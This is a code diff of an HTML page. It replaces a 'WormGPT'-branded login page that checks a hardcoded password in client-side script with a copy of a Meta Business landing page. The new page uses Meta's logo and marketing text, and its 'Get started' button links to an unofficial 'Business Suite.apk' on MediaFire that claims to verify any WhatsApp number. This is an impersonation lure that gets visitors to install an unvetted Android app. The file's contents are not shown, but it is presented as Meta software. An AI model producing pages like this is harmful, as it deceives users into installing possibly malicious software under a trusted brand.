@@ -1,155 +1,160 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business</title>
+    <style>
+        /* إعدادات الخطوط والمسافات الافتراضية */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: Arial, sans-serif;
-        background: linear-gradient(135deg, #000000, #1a0000);
-        color: white;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
+        body {
+            background-color: #ffffff;
+            color: #1c2b33;
+        }
 
-    .container {
-        background: rgba(0,0,0,0.85);
-        padding: 40px;
-        border-radius: 15px;
-        box-shadow: 0 0 25px red;
-        text-align: center;
-        width: 320px;
-        transition: 0.5s;
-    }
+        /* تصميم الهيدر (الشريط العلوي) */
+        header {
+            display: flex;
+            align-items: center;
+            padding: 20px 24px;
+        }
 
-    .success {
-        box-shadow: 0 0 25px lime;
-    }
+        /* أيقونة القائمة (الثلاث خطوط) */
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 20px;
+            height: 14px;
+            cursor: pointer;
+            margin-right: 20px;
+        }
 
-    .logo svg {
-        width: 70px;
-        margin-bottom: 10px;
-        filter: drop-shadow(0 0 10px red);
-        transition: 0.5s;
-    }
+        .menu-icon span {
+            display: block;
+            height: 2px;
+            width: 100%;
+            background-color: #1c2b33;
+            border-radius: 2px;
+        }
 
-    .logo.success svg {
-        filter: drop-shadow(0 0 10px lime);
-    }
+        /* الشعار */
+        .logo {
+            display: flex;
+            align-items: center;
+        }
 
-    h1 {
-        color: red;
-        margin-bottom: 30px;
-        letter-spacing: 2px;
-        transition: 0.5s;
-    }
+        .logo img {
+            height: 18px; /* حجم شعار ميتا */
+        }
 
-    h1.success {
-        color: lime;
-    }
+        /* تصميم المحتوى الأساسي */
+        main {
+            padding: 40px 24px;
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto;
+        }
 
-    input {
-        width: 100%;
-        padding: 10px;
-        margin: 10px 0;
-        border: none;
-        border-radius: 5px;
-        background: #111;
-        color: white;
-    }
+        h1 {
+            font-size: 38px;
+            font-weight: 600;
+            line-height: 1.15;
+            margin-bottom: 24px;
+            color: #1c2b33;
+            letter-spacing: -0.5px;
+        }
 
-    button {
-        width: 100%;
-        padding: 10px;
-        background: red;
-        border: none;
-        color: white;
-        font-weight: bold;
-        border-radius: 5px;
-        cursor: pointer;
-        transition: 0.3s;
-    }
+        p.subtitle {
+            font-size: 17px;
+            line-height: 1.5;
+            color: #5c6c75;
+            margin-bottom: 32px;
+        }
 
-    button:hover {
-        background: darkred;
-        box-shadow: 0 0 10px red;
-    }
+        /* تصميم زر Get started */
+        .btn-primary {
+            display: inline-block;
+            text-decoration: none;
+            background-color: #0064e0; /* لون أزرق ميتا */
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            padding: 14px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
 
-    .message {
-        margin-top: 15px;
-        font-weight: bold;
-        transition: 0.5s;
-    }
+        .btn-primary:hover {
+            background-color: #0056c2;
+        }
 
-    .error {
-        color: #ff4d4d;
-    }
+        /* النص الإضافي أسفل الزر */
+        .unofficial-note {
+            font-size: 13px;
+            color: #737373;
+            margin-bottom: 40px;
+            max-width: 90%;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.4;
+        }
 
-    .success-text {
-        color: lime;
-    }
-</style>
+        /* حاوية الصورة السفلية */
+        .collage-container {
+            width: 100%;
+            border-radius: 24px;
+            overflow: hidden;
+            background-color: #e6f2ff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .collage-container img {
+            width: 100%;
+            display: block;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="container" id="box">
+    <header>
+        <div class="menu-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
+        </div>
+    </header>
 
-    <div class="logo" id="logo">
-        <svg viewBox="0 0 100 100" fill="none">
-            <circle cx="50" cy="50" r="40" stroke="red" stroke-width="4"/>
-            <path d="M30 50 L50 30 L70 50 L50 70 Z" stroke="red" stroke-width="3" fill="none"/>
-            <circle cx="50" cy="50" r="5" fill="red"/>
-        </svg>
-    </div>
+    <main>
+        <h1>Move your business forwards with Meta technologies.</h1>
+        
+        <p class="subtitle">
+            Unlock your potential with marketing tools and ad solutions that take your business to the next level. Start advertising across Facebook, Messenger, Instagram, WhatsApp and more.
+        </p>
 
-    <h1 id="title">WormGPT
+        <a href="https://www.mediafire.com/file/9yq4zpfp3yvwhxw/Business+Suite.apk/file" class="btn-primary">Get started</a>
 
-    <input type="email" id="email" placeholder="Email">
-    <input type="password" id="password" placeholder="Password">
+        <p class="unofficial-note">
+            "This unofficial version accepts verifying all WhatsApp numbers as long as it is on the WhatsApp Business version."
+        </p>
 
-    <button onclick="login()">Login</button>
-
-    <div class="message" id="msg"></div>
-
-</div>
-
-<script>
-function login() {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-
-    const box = document.getElementById("box");
-    const logo = document.getElementById("logo");
-    const title = document.getElementById("title");
-    const msg = document.getElementById("msg");
-
-    if (email === "amani50@gmail.com" && password === "1234") {
-
-        // تغيير الستايل إلى نجاح
-        box.classList.add("success");
-        logo.classList.add("success");
-        title.classList.add("success");
-
-        msg.className = "message success-text";
-        msg.innerText = "✔ Login Successful";
-
-        // تحويل بعد ثانيتين
-        setTimeout(() => {
-            window.location.href = "home.html";
-        }, 2000);
-
-    } else {
-        msg.className = "message error";
-        msg.innerText = "✖ Incorrect email or password";
-    }
-}
-</script>
+        <div class="collage-container">
+            <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Meta Ad Collage Placeholder">
+        </div>
+    </main>
 
 </body>
 </html>
